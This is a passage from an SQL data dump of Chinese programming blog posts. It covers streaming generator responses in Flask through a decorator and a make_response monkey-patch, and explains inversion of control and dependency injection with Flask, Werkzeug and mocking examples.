class="bp">self</span><span class="o">.</span><span class="n">response_class</span><span class="o">.</span><span class="n">force_type</span><span class="p">(</span><span class="n">rv</span><span class="p">,</span> <span class="n">request</span><span class="o">.</span><span class="n">environ</span><span class="p">)</span>\n</pre></div>\n</figure><p>那么 Response 又是如何支持迭代器响应的呢？在 Flask 的邮件列表中有一个线索 <a class="footnote-reference" href="https://blog.tonyseek.com/atom.xml#id9" id="id4">[3]</a> 提到：</p>\n<blockquote>\nyield is a keyword in Python that creates generators which are often the base of streaming functionality in frameworks.  The underlaying Werkzeug system does support generators but Flask does not directly accept them. You can however use them with a trick:</blockquote>\n<p>该线索的作者给出了一个可行的方案，就是手动产生 <tt class="docutils literal">Response</tt> 对象：</p>\n<figure class="code"><div class="highlight"><pre><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Response</span>\n\n<span class="nd">@app.route</span><span class="p">(</span><span class="s">''/foo''</span><span class="p">)</span>\n<span class="k">def</span> <span class="nf">foo</span><span class="p">():</span>\n    <span class="k">def</span> <span class="nf">generate</span><span class="p">():</span>\n        <span class="k">yield</span> <span class="s">''first part''</span>\n        <span class="k">yield</span> <span class="s">''second part''</span>\n    <span class="k">return</span> <span class="n">Response</span><span class="p">(</span><span class="n">generate</span><span class="p">(),</span> <span class="n">direct_passthrough</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>\n</pre></div>\n</figure><p>这么一来 Flask 就可以使用迭代器产生流式响应了。但是比起 Bottle 那么简洁的方式来说，这个 Response 的包装过程真是十分的罗嗦和丑陋啊。这个时候我们有两种选择，第一是编写一个装饰器：</p>\n<figure class="code"><div class="highlight"><pre><span class="kn">from</span> <span class="nn">functools</span> <span class="kn">import</span> <span class="n">update_wrapper</span>\n<span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Response</span><span class="p">,</span> <span class="n">current_app</span>\n\n\n<span class="k">class</span> <span class="nc">StreamView</span><span class="p">(</span><span class="nb">object</span><span class="p">):</span>\n    <span class="sd">&quot;&quot;&quot;A decorator for flask view.&quot;&quot;&quot;</span>\n\n    <span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">view_function</span><span class="p">):</span>\n        <span class="bp">self</span><span class="o">.</span><span class="n">view_function</span> <span class="o">=</span> <span class="n">view_function</span>\n        <span class="n">update_wrapper</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">view_function</span><span class="p">)</span>\n\n    <span class="k">def</span> <span class="nf">__call__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="o">*</span><span class="n">args</span><span class="p">,</span> <span class="o">**</span><span class="n">kwargs</span><span class="p">):</span>\n        <span class="n">return_value</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">view_function</span><span class="p">(</span><span class="o">*</span><span class="n">args</span><span class="p">,</span> <span class="o">**</span><span class="n">kwargs</span><span class="p">)</span>\n        <span class="k">try</span><span class="p">:</span>\n            <span class="n">response</span> <span class="o">=</span> <span class="nb">iter</span><span class="p">(</span><span class="n">return_value</span><span class="p">)</span>\n        <span class="k">except</span> <span class="ne">TypeError</span><span class="p">:</span>\n            <span class="c"># the return value is not iterable</span>\n            <span class="n">response</span> <span class="o">=</span> <span class="n">return_value</span>\n            <span class="n">current_app</span><span class="o">.</span><span class="n">logger</span><span class="o">.</span><span class="n">warning</span><span class="p">(</span>\n                <span class="s">&quot;The stream view </span><span class="si">%r</span><span class="s"> isn''t iterable.&quot;</span> <span class="o">%</span> <span class="bp">self</span><span class="p">)</span>\n        <span class="k">else</span><span class="p">:</span>\n            <span class="c"># the return value is iterable</span>\n            <span class="n">response</span> <span class="o">=</span> <span class="n">Response</span><span class="p">(</span><span class="n">return_value</span><span class="p">,</span> <span class="n">direct_passthrough</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>\n        <span class="k">return</span> <span class="n">response</span>\n\n\n<span class="n">stream_view</span> <span class="o">=</span> <span class="n">StreamView</span>\n</pre></div>\n</figure><p>然后用它来装饰需要使用生成器（或返回迭代器）的视图函数：</p>\n<figure class="code"><div class="highlight"><pre><span class="nd">@app.route</span><span class="p">(</span><span class="s">''/stream''</span><span class="p">)</span>\n<span class="nd">@stream_view</span>\n<span class="k">def</span> <span class="nf">stream</span><span class="p">():</span>\n    <span class="k">yield</span> <span class="s">''START''</span>\n    <span class="n">sleep</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>\n    <span class="k">yield</span> <span class="s">''MIDDLE''</span>\n    <span class="n">sleep</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>\n    <span class="k">yield</span> <span class="s">''END''</span>\n</pre></div>\n</figure><p>非常简洁易用，个人很推荐。</p>\n<p>第二种方法则适用于开发者觉得装饰器都太累赘的情况，这种情况我们可以给 Flask 的 <tt class="docutils literal">make_response</tt> 打一个猴子补丁，让它像对字符串一样对迭代器进行包装。为了不要太丑陋，我用写 Flask Extension 的方法把这个猴子补丁写出来。</p>\n<figure class="code"><div class="highlight"><pre><span class="kn">import</span> <span class="nn">types</span>\n\n<span class="k">class</span> <span class="nc">GeneratorView</span><span class="p">(</span><span class="nb">object</span><span class="p">):</span>\n    <span class="sd">&quot;&quot;&quot;A Flask extension to support the generator view.&quot;&quot;&quot;</span>\n\n    <span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">app</span><span class="o">=</span><span class="bp">None</span><span class="p">):</span>\n        <span class="bp">self</span><span class="o">.</span><span class="n">app</span> <span class="o">=</span> <span class="bp">None</span>\n        <span class="k">if</span> <span class="n">app</span><span class="p">:</span>\n            <span class="bp">self</span><span class="o">.</span><span class="n">init_app</span><span class="p">(</span><span class="n">app</span><span class="p">)</span>\n\n    <span class="k">def</span> <span class="nf">init_app</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">app</span><span class="p">):</span>\n        <span class="bp">self</span><span class="o">.</span><span class="n">app</span> <span class="o">=</span> <span class="n">app</span>\n        <span class="c"># replace the ``make_response`` self.make_response = app.make_response</span>\n        <span class="n">app</span><span class="o">.</span><span class="n">make_response</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">make_stream_response</span>\n\n    <span class="k">def</span> <span class="nf">make_stream_response</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">rv</span><span class="p">):</span>\n        <span class="k">if</span> <span class="nb">isinstance</span><span class="p">(</span><span class="n">rv</span><span class="p">,</span> <span class="n">types</span><span class="o">.</span><span class="n">GeneratorType</span><span class="p">):</span>\n            <span class="k">return</span> <span class="bp">self</span><span class="o">.</span><span class="n">app</span><span class="o">.</span><span class="n">response_class</span><span class="p">(</span>\n                <span class="n">rv</span><span class="p">,</span> <span class="n">direct_passthrough</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>\n        <span class="k">return</span> <span class="bp">self</span><span class="o">.</span><span class="n">make_response</span><span class="p">(</span><span class="n">rv</span><span class="p">)</span>\n</pre></div>\n</figure><p>然后像安装普通 Flask Extension 一样将这个扩展安装到 <tt class="docutils literal">app</tt> 上，视图函数就彻底支持用生成器产生的流式响应的。值得注意的一点是在 <tt class="docutils literal">make_stream_response</tt> 方法中我出于性能考虑使用 <tt class="docutils literal">isinstance</tt> 而不是 <tt class="docutils literal"><span class="pre">try-except</span></tt> 来判别视图函数返回值类型，这样就无法对非生成器类型的迭代器生效了，这算是违背鸭子类型指导的后果吧（谁让你去检查它的 DNA 而不检查它会不会游泳）。如果需要返回其他类型迭代器，可能还是需要像前文的装饰器一样改成 <tt class="docutils literal"><span class="pre">try-except</span></tt> 模式。</p>\n<p>最后附上一个挺好玩的例子，访问 <tt class="docutils literal"><span class="pre">http://localhost:5000/stream/5</span></tt> 就可以每隔一秒生成一个数字，直到第五秒结束。</p>\n<figure class="code"><div class="highlight"><pre><span class="kn">from</span> <span class="nn">time</span> <span class="kn">import</span> <span class="n">sleep</span>\n<span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span>\n\n<span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="n">__name__</span><span class="p">)</span>\n<span class="n">generator_view</span> <span class="o">=</span> <span class="n">GeneratorView</span><span class="p">(</span><span class="n">app</span><span class="p">)</span>\n\n<span class="nd">@app.route</span><span class="p">(</span><span class="s">''/stream/&lt;int:seconds&gt;''</span><span class="p">)</span>\n<span class="k">def</span> <span class="nf">stream</span><span class="p">(</span><span class="n">seconds</span><span class="p">):</span>\n    <span class="k">yield</span> <span class="s">&quot;&lt;ul&gt;&quot;</span>\n    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">seconds</span><span class="p">)):</span>\n        <span class="k">yield</span> <span class="s">&quot;&lt;li&gt;</span><span class="si">%d</span><span class="s">&lt;/li&gt;&quot;</span> <span class="o">%</span> <span class="p">(</span><span class="n">i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span>\n        <span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>\n    <span class="k">yield</span> <span class="s">&quot;&lt;/ul&gt;&quot;</span>\n\n<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">&quot;__main__&quot;</span><span class="p">:</span>\n    <span class="n">app</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">debug</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>\n</pre></div>\n</figure><p>这个例子用异步来实现更好，但我没有尝试过结合 gevent 和 Flask。Bottle 的文档倒是有例子。本文的缘起也正是那个例子 <a class="footnote-reference" href="https://blog.tonyseek.com/atom.xml#id10" id="id5">[4]</a> 。</p>\n<table class="docutils footnote" frame="void" id="id6" rules="none">\n<colgroup><col class="label" /><col /></colgroup>\n<tbody valign="top">\n<tr><td class="label"><a class="fn-backref" href="https://blog.tonyseek.com/atom.xml#id1">[0]</a></td><td><a class="reference external" href="http://bottlepy.org">Bottle</a></td></tr>\n</tbody>\n</table>\n<table class="docutils footnote" frame="void" id="id7" rules="none">\n<colgroup><col class="label" /><col /></colgroup>\n<tbody valign="top">\n<tr><td class="label"><a class="fn-backref" href="https://blog.tonyseek.com/atom.xml#id2">[1]</a></td><td><a class="reference external" href="http://bottlepy.org/docs/dev/tutorial.html#generating-content">Iterables and generators</a></td></tr>\n</tbody>\n</table>\n<table class="docutils footnote" frame="void" id="id8" rules="none">\n<colgroup><col class="label" /><col /></colgroup>\n<tbody valign="top">\n<tr><td class="label"><a class="fn-backref" href="https://blog.tonyseek.com/atom.xml#id3">[2]</a></td><td><a class="reference external" href="http://www.python.org/dev/peps/pep-0333/#the-application-framework-side">The application and framework side of WSGI</a></td></tr>\n</tbody>\n</table>\n<table class="docutils footnote" frame="void" id="id9" rules="none">\n<colgroup><col class="label" /><col /></colgroup>\n<tbody valign="top">\n<tr><td class="label"><a class="fn-backref" href="https://blog.tonyseek.com/atom.xml#id4">[3]</a></td><td><a class="reference external" href="http://flask.pocoo.org/mailinglist/archive/2010/11/3/using-yield/#478b0c1829b5263700da1db7d2d22c79">Using yield</a></td></tr>\n</tbody>\n</table>\n<table class="docutils footnote" frame="void" id="id10" rules="none">\n<colgroup><col class="label" /><col /></colgroup>\n<tbody valign="top">\n<tr><td class="label"><a class="fn-backref" href="https://blog.tonyseek.com/atom.xml#id5">[4]</a></td><td><a class="reference external" href="http://bottlepy.org/docs/dev/async.html#greenlets-to-the-rescue">Primer to Asynchronous Applications</a></td></tr>\n</tbody>\n</table>', '2014-11-06 23:43:08', 6, '2012-04-05 17:22:00', '2012-04-05 17:22:00', 0, '[["self", 0.35541200684297297], ["app", 0.35541200684297297], ["response", 0.33925691562283783], ["Flask", 0.2746365507422973], ["return", 0.24232636830202703], ["yield", 0.24232636830202703], ["stream", 0.24232636830202703], ["rv", 0.21001618586175677], ["__", 0.19386109464162163], ["\\u8fed\\u4ee3", 0.1785455009854054], ["view", 0.17770600342148649], ["def", 0.17770600342148649], ["make", 0.17770600342148649], ["Response", 0.14539582098121623], ["import", 0.12924072976108109], ["\\u89c6\\u56fe", 0.12110061830148648], ["sleep", 0.11308563854094594], ["class", 0.11308563854094594], ["function", 0.09693054732081081], ["Bottle", 0.09693054732081081]]', NULL, NULL, '用过 Bottle [0] 的同学应该不会忘记它的流式响应 [1] ——在视图函数中使用 yield 关键字，让调用结果成为一个迭代器，那么 HTTP 客户端将会得到这个迭代器每次迭代的结果一部分，迭代器产生多少客户端收到多少，就像流一样。用这种方法在产生一些大的响应对象时（比如大文件下载），能有效地节约服务器内存。\n运行以下代码并在浏览器访问 http://localhost:5000/stream\n\nstream.py from time import sleep\n from bottle import route, run\n\n @route(''/stream'')\n def stream():\n     yield ''START''\n     sleep(3)\n     yield ''MIDDLE''\n     sleep(5)\n     yield ''END''\n\n run()\n\n就能看到 "START" 出现之后，过了三秒 "MIDDLE" 才出现，再过了五秒 "END" 出现，然后浏览器的小转盘停止旋转，响应结束。\n这个特性其实不是 Bottle 本身的特性，而是 WSGI 中已经规定的支持 [2] 。WSGI 标准要求 WSGI Application 返回的就是迭代器，所以我们平时返回的“整块”响应其实都已被 Web 框架包装成只产生一个元素的迭代器。\n比较纠结的是，在 Flask 却不能像 Bottle 一样这么便捷。如果在 Flask 的视图函数里面使用 yield ，那么将得到一个 TypeError 异常，异常提示信息说：\n\nTypeError: ''generator'' object is not callable\n\n原来 Flask 要求视图函数返回的结果是可调用的。从 Flask 文档中得知，Flask 能够处理的响应是 werkzeug 中 Response 或其子类的实例。而我们平时使用视图函数，一般是返回一个字符串的，该字符串会被 Flask 包装成 Response 对象，也就是说这里给了一点点糖。具体做这件事的，是 flask.app.Flask 类中的 make_response 方法：\ndef make_response(self, rv):\n    if rv is None:\n        raise ValueError(''View function did not return a response'')\n    if isinstance(rv, self.response_class):\n        return rv\n    if isinstance(rv, basestring):\n        return self.response_class(rv)\n    if isinstance(rv, tuple):\n        return self.response_class(*rv)\n    return self.response_class.force_type(rv, request.environ)\n\n那么 Response 又是如何支持迭代器响应的呢？在 Flask 的邮件列表中有一个线索 [3] 提到：\n\nyield is a keyword in Python that creates generators which are often the base of streaming functionality in frameworks.  The underlaying Werkzeug system does support generators but Flask does not directly accept them. You can however use them with a trick:\n该线索的作者给出了一个可行的方案，就是手动产生 Response 对象：\nfrom flask import Response\n\n@app.route(''/foo'')\ndef foo():\n    def generate():\n        yield ''first part''\n        yield ''second part''\n    return Response(generate(), direct_passthrough=True)\n\n这么一来 Flask 就可以使用迭代器产生流式响应了。但是比起 Bottle 那么简洁的方式来说，这个 Response 的包装过程真是十分的罗嗦和丑陋啊。这个时候我们有两种选择，第一是编写一个装饰器：\nfrom functools import update_wrapper\nfrom flask import Response, current_app\n\n\nclass StreamView(object):\n    """A decorator for flask view."""\n\n    def __init__(self, view_function):\n        self.view_function = view_function\n        update_wrapper(self, self.view_function)\n\n    def __call__(self, *args, **kwargs):\n        return_value = self.view_function(*args, **kwargs)\n        try:\n            response = iter(return_value)\n        except TypeError:\n            # the return value is not iterable\n            response = return_value\n            current_app.logger.warning(\n                "The stream view %r isn''t iterable." % self)\n        else:\n            # the return value is iterable\n            response = Response(return_value, direct_passthrough=True)\n        return response\n\n\nstream_view = StreamView\n\n然后用它来装饰需要使用生成器（或返回迭代器）的视图函数：\n@app.route(''/stream'')\n@stream_view\ndef stream():\n    yield ''START''\n    sleep(3)\n    yield ''MIDDLE''\n    sleep(5)\n    yield ''END''\n\n非常简洁易用，个人很推荐。\n第二种方法则适用于开发者觉得装饰器都太累赘的情况，这种情况我们可以给 Flask 的 make_response 打一个猴子补丁，让它像对字符串一样对迭代器进行包装。为了不要太丑陋，我用写 Flask Extension 的方法把这个猴子补丁写出来。\nimport types\n\nclass GeneratorView(object):\n    """A Flask extension to support the generator view."""\n\n    def __init__(self, app=None):\n        self.app = None\n        if app:\n            self.init_app(app)\n\n    def init_app(self, app):\n        self.app = app\n        # replace the ``make_response`` self.make_response = app.make_response\n        app.make_response = self.make_stream_response\n\n    def make_stream_response(self, rv):\n        if isinstance(rv, types.GeneratorType):\n            return self.app.response_class(\n                rv, direct_passthrough=True)\n        return self.make_response(rv)\n\n然后像安装普通 Flask Extension 一样将这个扩展安装到 app 上，视图函数就彻底支持用生成器产生的流式响应的。值得注意的一点是在 make_stream_response 方法中我出于性能考虑使用 isinstance 而不是 try-except 来判别视图函数返回值类型，这样就无法对非生成器类型的迭代器生效了，这算是违背鸭子类型指导的后果吧（谁让你去检查它的 DNA 而不检查它会不会游泳）。如果需要返回其他类型迭代器，可能还是需要像前文的装饰器一样改成 try-except 模式。\n最后附上一个挺好玩的例子，访问 http://localhost:5000/stream/5 就可以每隔一秒生成一个数字，直到第五秒结束。\nfrom time import sleep\nfrom flask import Flask\n\napp = Flask(__name__)\ngenerator_view = GeneratorView(app)\n\n@app.route(''/stream/<int:seconds>'')\ndef stream(seconds):\n    yield "<ul>"\n    for i in range(int(seconds)):\n        yield "<li>%d</li>" % (i + 1)\n        sleep(1)\n    yield "</ul>"\n\nif __name__ == "__main__":\n    app.run(debug=True)\n\n这个例子用异步来实现更好，但我没有尝试过结合 gevent 和 Flask。Bottle 的文档倒是有例子。本文的缘起也正是那个例子 [4] 。\n\n\n\n[0]Bottle\n\n\n\n\n\n[1]Iterables and generators\n\n\n\n\n\n[2]The application and framework side of WSGI\n\n\n\n\n\n[3]Using yield\n\n\n\n\n\n[4]Primer to Asynchronous Applications\n\n', NULL, NULL, NULL),
(87, 'https://blog.tonyseek.com/post/notes-about-ioc-and-di/', '控制反转 (IoC) 和依赖注入 (DI)', '<p>说来惭愧，听说 <a class="reference external" href="https://en.wikipedia.org/wiki/Inversion_of_control">控制反转（Inversion of Control）</a> 和 <a class="reference external" href="https://en.wikipedia.org/wiki/Dependency_injection">依赖注入（Dependency Injection）</a> 这两个名词已经是大二的事情了，时至今日才想明白了具体的含义。我之前知道依赖注入的用法，一直将控制反转将其等同化，现在看来二者其实还是存在差别的。于是今天就此也顺便查阅了一些资料，将一些思考记录下来。</p>\n\n<div class="section" id="framework-and-library">\n<h2>框架和库（Framework and Library）的区别</h2>\n<p>最早看到这个问题，是在一份面试题上：“框架（Framework）和库（Library）有什么区别？”，那篇博文的作者给出的是一个很口头的说法：客户程序员使用库，框架使用客户程序员。我当时只是粗略地接受了这个说法，并没有意识到，这就是控制是否被反转了的区别。今天看 limodou 在 PyCon 2011 的 Presentation <a class="reference external" href="http://pycon.b0.upaiyun.com/keynotes/topic/LiYinghui.pdf">《Web 框架开发思考与实践》</a> ，再次提到了这个问题。limodou 引用了 <a class="reference external" href="http://martinfowler.com/bliki/InversionOfControl.html">Martin Fowler 对控制反转的定义</a> ：</p>\n<blockquote>\n<p>Inversion of Control is a key part of what makes a framework different to a library. A library is essentially a set of functions that you can call, these days usually organized into classes. Each call does some work and returns control to the client.</p>\n<p>A framework embodies some abstract design, with more behavior built in. In order to use it you need to insert your behavior into various places in the framework either by subclassing or by plugging in your own classes. The framework''s code then calls your code at these points.</p>\n</blockquote>\n<p>在 Martin Fowler 的看法中，控制反转是框架和库的关键区别所在。对于一个库而言，用户程序员使用的方式是主动调用它，这是通常情况的做法，也就是“正向”控制；而对于一个框架，往往将用户程序员编写的代码注册到框架中，最后由框架来调用用户程序员编写的代码，这就构成了控制反转。也就是说，控制反转的关键在于“控制者”是谁。对于一个库而言，复用的可能只是算法和数据结构；而对于一个框架而言，复用的往往还有控制流逻辑，这也是控制反转的结果。</p>\n</div>\n<div class="section" id="python-web">\n<h2>看 Python Web 框架中的控制反转</h2>\n<p>我最喜欢的一个 Python Web 框架是 Flask，从这里我们可以轻易的找出控制反转的应用。比如编写一个 Hello World 演示页面，Flask 的做法是：</p>\n<figure class="code"><figcaption><span>hello.py</span></figcaption><div class="highlight"><pre> <span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span>\n\n <span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="n">__name__</span><span class="p">)</span>\n\n <span class="nd">@app.route</span><span class="p">(</span><span class="s">&quot;/&quot;</span><span class="p">)</span>\n <span class="k">def</span> <span class="nf">show_helloworld</span><span class="p">():</span>\n     <span class="k">return</span> <span class="s">&quot;hello, world&quot;</span>\n\n <span class="n">app</span><span class="o">.</span><span class="n">run</span><span class="p">()</span>\n</pre></div>\n</figure><p>在这里，用户程序员编写了产生视图输出的函数 <tt class="docutils literal">show_helloworld</tt> 。当用户不用管 WSGI 是如何控制执行流的，只要将它用 <tt class="docutils literal">&#64;app.route</tt> 装饰器注册到 <tt class="docutils literal">Flask</tt> 的实例 <tt class="docutils literal">app</tt> 中，调用 <tt class="docutils literal">app.run</tt> 之后 <tt class="docutils literal">Flask</tt> 将在每次请求的 URI 命中路由 <tt class="docutils literal">/</tt> 时，调用 <tt class="docutils literal">show_helloworld</tt> 。</p>\n<p>所以，用 Flask 编写 Web 应用的方式是控制反转的应用，Flask 是一个框架而不是一个库。</p>\n<p>而对比 Flask 底层所使用的基础库 Werkzeug，可以很明显的看出区别。同样的 Hello World 演示，原始 WSGI 这样写：</p>\n<figure class="code"><figcaption><span>wsgi.py</span></figcaption><div class="highlight"><pre> <span class="k">def</span> <span class="nf">application</span><span class="p">(</span><span class="n">environ</span><span class="p">,</span> <span class="n">start_response</span><span class="p">):</span>\n     <span class="n">start_response</span><span class="p">(</span><span class="s">''200 OK''</span><span class="p">,</span> <span class="p">[(</span><span class="s">''Content-Type''</span><span class="p">,</span> <span class="s">''text/plain''</span><span class="p">)])</span>\n     <span class="k">return</span> <span class="p">[</span><span class="s">''Hello World!''</span><span class="p">]</span>\n</pre></div>\n</figure><p>Werkzeug 则在 HTTP 请求、响应方面提供了更为方便的包装：</p>\n<figure class="code"><figcaption><span>wsgi.py</span></figcaption><div class="highlight"><pre> <span class="kn">from</span> <span class="nn">werkzeug.wrappers</span> <span class="kn">import</span> <span class="n">Request</span><span class="p">,</span> <span class="n">Response</span>\n\n <span class="k">def</span> <span class="nf">application</span><span class="p">(</span><span class="n">environ</span><span class="p">,</span> <span class="n">start_response</span><span class="p">):</span>\n     <span class="n">request</span> <span class="o">=</span> <span class="n">Request</span><span class="p">(</span><span class="n">environ</span><span class="p">)</span>\n     <span class="n">text</span> <span class="o">=</span> <span class="s">''Hello </span><span class="si">%s</span><span class="s">!''</span> <span class="o">%</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s">''name''</span><span class="p">,</span> <span class="s">''World''</span><span class="p">)</span>\n     <span class="n">response</span> <span class="o">=</span> <span class="n">Response</span><span class="p">(</span><span class="n">text</span><span class="p">,</span> <span class="n">mimetype</span><span class="o">=</span><span class="s">''text/plain''</span><span class="p">)</span>\n     <span class="k">return</span> <span class="n">response</span><span class="p">(</span><span class="n">environ</span><span class="p">,</span> <span class="n">start_response</span><span class="p">)</span>\n</pre></div>\n</figure><p>这种包装和 Flask 最大的不同，是这里并未将控制权交给 Werkzeug，而是仍然把握在 <tt class="docutils literal">application</tt> 函数内，用户程序员调用了 Werkzeug 的组件，但并未委托控制权。如果要实现和上述 Flask 版 Hello World 等价，这里还需要判断 URI 是否为 <tt class="docutils literal">''/''</tt> ，如果不是还需要返回 HTTP 404 错误。但如果要实现这些，都需要用户程序员在 <tt class="docutils literal">application</tt> 函数中自己实现。实现过程可能可以调用 Werkzeug 简化细节，但控制权仍然在用户程序员自己手里。所以这里没有应用控制反转，Werkzeug 是一个库而不是一个框架。</p>\n</div>\n<div class="section" id="id1">\n<h2>依赖注入</h2>\n<p><a class="reference external" href="https://en.wikipedia.org/wiki/Dependency_injection">依赖注入（Dependency Injection）</a> 则是和控制反转相关的一个话题，最初的目的是解除程序组件之间的一些直接耦合。具体的做法是，将原本的 A 依赖 B，改成 A 依赖一个接口和一个 DI 容器（B 实现了 A 依赖的那个接口），然后将 B 的创建工厂（其中可能使用了创建型设计模式，并将类型转化为 A 所依赖的接口才返回）注册到 DI 容器，最后 A 只需要给 DI 容器一个标识索取 B，DI 容器将回调 B 的创建工厂，生产出 B 的实例之后交给 A。</p>\n<p>如果在动态语言（比如 Python 比如 Ruby）里面这么做，则是一件非常第三类青年的事情。为什么不能直接让 A 去调用 B 的工厂呢？中途插入一个注册表有区别吗？所以我不做第三类青年，在使用 Python 的时候我会选择直接调用工厂，但这在静态语言中行不通。一来静态语言有着静态的变量类型，手动构造带有类型转换的工厂，还不如交托给一个自动构造的容器；二来静态语言的编译期、装载期、运行期是严格分离的，要想运行期做装载的事情，必须运用反射来处理，这个处理语言并没有内置（否则就近似动态语言了），必须编写专门的组件来做，DI 容器就是专门的组件。</p>\n<p>归根结底，依赖注入的本质是运用控制反转。前面说了，要生产对象的工厂是被注册到 DI 容器的（有的 DI 容器可以自动构造常用的工厂），也就是说 DI 容器在对象生产方面就是“框架”，是控制权的主导者。</p>\n</div>\n<div class="section" id="id2">\n<h2>依赖注入在静态语言中的价值</h2>\n<p>使用依赖注入，对于静态语言编写的应用来说最大的好处是增加可测试性。前文说了，依赖注入对于静态语言编写的应用一个重要价值是将对象的索取从编译期、装载期移到了运行期。如此一来，即使是已经经过编译的组件，也可以通过更改 DI 容器的配置，将一个被依赖对象替换。</p>\n<p>在做单元测试的时候，用 Stub、Mock 隔离依赖的组件是常用的手法。一般的做法是让 Stub、Mock 对象和真实对象实现相同的接口，以达到“以假乱真”的目的。DI 容器在这个过程中，则负责“替换”这个过程。在生产环境，DI 容器使用生产环境的配置文件，注入到目标对象中的是真实对象；而在测试环境，DI 容器使用测试环境的配置文件，将 Stub 或 Mock 注入到目标对象。</p>\n</div>\n<div class="section" id="di">\n<h2>DI 容器在动态语言中的不必要</h2>\n<p>前文说到，依赖注入对于静态语言构建的项目来说很有价值的一点是增强可测试性。这是由于静态语言本身在编译期、装载期处理依赖。对于动态语言来说，编译期、装载期、运行期是一体的，所以依赖注入在动态语言中可以有着原生的支持，独立的 DI 容器在动态语言构建的项目中没有存在的必要性。</p>\n<p>还是前文说的单元测试 Stub、Mock 的例子，假如在 Python 这样的动态语言中，需要对一个已经编译好的模块使用 Stub、Mock，只需要直接替换其属性。</p>\n<figure class="code"><div class="highlight"><pre><span class="kn">import</span> <span class="nn">unittest</span>\n<span class="kn">import</span> <span class="nn">urllib2</span>\n<span class="kn">import</span> <span class="nn">fakeurllib2</span>\n\n<span class="k">def</span> <span class="nf">install_mock</span><span class="p">(</span><span class="n">urllib2</span><span class="p">):</span>\n    <span class="n">urlllib2</span><span class="o">.</span><span class="n">Request</span> <span class="o">=</span> <span class="n">fakeurllib2</span><span class="o">.</span><span class="n">Request</span>\n\n<span class="k">def</span> <span class="nf">install_stub</span><span class="p">(</span><span class="n">urllib2</span><span class="p">):</span>\n    <span class="n">urllib2</span><span class="o">.</span><span class="n">urlopen</span> <span class="o">=</span> <span class="n">fakeurllib2</span><span class="o">.</span><span class="n">urlopen</span>\n\n\n<span class="n">install_mock</span><span class="p">(</span><span class="n">urllib2</span><span class="p">)</span>\n<span class="n">install_stub</span><span class="p">(</span><span class="n">urllib2</span><span class="p">)</span>\n\n\n<span class="k">class</span> <span class="nc">MyTest</span><span class="p">(</span><span class="n">unittest</span><span class="o">.</span><span class="n">TestCase</span><span class="p">):</span>\n\n    <span class="c"># ...</span>\n</pre></div>\n</figure><p>可见，动态语言的运行时环境本身就是一个强大的依赖注入容器。</p>\n</div>', '2014-11-06 23:43:08', 6, '2012-04-04 12:23:00', '2012-04-04 12:23:00', 0, '[["DI", 0.18432460907555065], ["\\u5bb9\\u5668", 0.1496653018593833], ["Flask", 0.14482647855936123], ["\\u4f9d\\u8d56", 0.13805950274286344], ["\\u53cd\\u8f6c", 0.1234872997379956], ["\\u8bed\\u8a00", 0.11539587969204845], ["\\u6846\\u67b6", 0.11167107101931718], ["\\u7a0b\\u5e8f\\u5458", 0.10670336004845814], ["\\u6ce8\\u5165", 0.09282827576835903], ["\\u63a7\\u5236", 0.08733723933621146], ["\\u9759\\u6001", 0.08266515879806167], ["Werkzeug", 0.07899626103237885], ["app", 0.07899626103237885], ["response", 0.07899626103237885], ["urllib2", 0.07899626103237885], ["\\u8c03\\u7528", 0.07433344358546255], ["\\u7f16\\u5199", 0.07034780254951542], ["def", 0.06583021752698237], ["Mock", 0.06583021752698237], ["World", 0.06583021752698237]]', NULL, NULL, '说来惭愧，听说 控制反转（Inversion of Control） 和 依赖注入（Dependency Injection） 这两个名词已经是大二的事情了，时至今日才想明白了具体的含义。我之前知道依赖注入的用法，一直将控制反转将其等同化，现在看来二者其实还是存在差别的。于是今天就此也顺便查阅了一些资料，将一些思考记录下来。\n\n\n框架和库（Framework and Library）的区别\n最早看到这个问题，是在一份面试题上：“框架（Framework）和库（Library）有什么区别？”，那篇博文的作者给出的是一个很口头的说法：客户程序员使用库，框架使用客户程序员。我当时只是粗略地接受了这个说法，并没有意识到，这就是控制是否被反转了的区别。今天看 limodou 在 PyCon 2011 的 Presentation 《Web 框架开发思考与实践》 ，再次提到了这个问题。limodou 引用了 Martin Fowler 对控制反转的定义 ：\n\nInversion of Control is a key part of what makes a framework different to a library. A library is essentially a set of functions that you can call, these days usually organized into classes. Each call does some work and returns control to the client.\nA framework embodies some abstract design, with more behavior built in. In order to use it you need to insert your behavior into various places in the framework either by subclassing or by plugging in your own classes. The framework''s code then calls your code at these points.\n\n在 Martin Fowler 